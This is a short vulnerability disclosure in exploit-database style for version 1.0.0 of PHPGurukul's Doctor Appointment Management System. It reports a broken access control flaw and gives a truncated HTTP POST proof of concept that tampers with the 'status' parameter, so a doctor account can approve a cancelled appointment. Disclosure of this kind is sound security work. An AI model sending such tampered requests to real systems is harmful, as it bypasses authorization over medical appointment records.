# Exploit Title: Doctor Appointment Management System - V 1.0.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/doctor-appointment-management-system-using-php-and-mysql/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v1.0.0
## Exploit Description:
## Doctor Appointment Management System - V 1.0.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update the appointment status from cancelled to approved that can not modify in UI.

## ---------------------------------POC-----------------------------
```
POST /dams/doctor/view-appointment-detail.php?editid=8&&aptid=154553066 HTTP/1.1
...

remark=hello&status=Approved(CHENGE HERE)&submit=
```